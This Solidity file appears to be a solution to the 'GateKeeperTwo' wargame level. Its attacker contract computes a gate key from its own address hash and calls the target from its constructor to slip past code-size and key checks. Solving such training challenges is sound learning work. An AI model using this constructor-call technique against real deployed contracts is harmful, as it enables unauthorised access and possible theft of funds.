// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGateKeeperTwo {
    function enter(bytes8 _gateKey) payable external returns (bool) ;
}

contract GateKeeperTwoAttacker{
    
    constructor(address _targetAddress) {
        uint64 intKey = uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^type(uint64).max;
        bytes8 _key = bytes8(intKey);
        IGateKeeperTwo(_targetAddress).enter(_key);
    }
   
}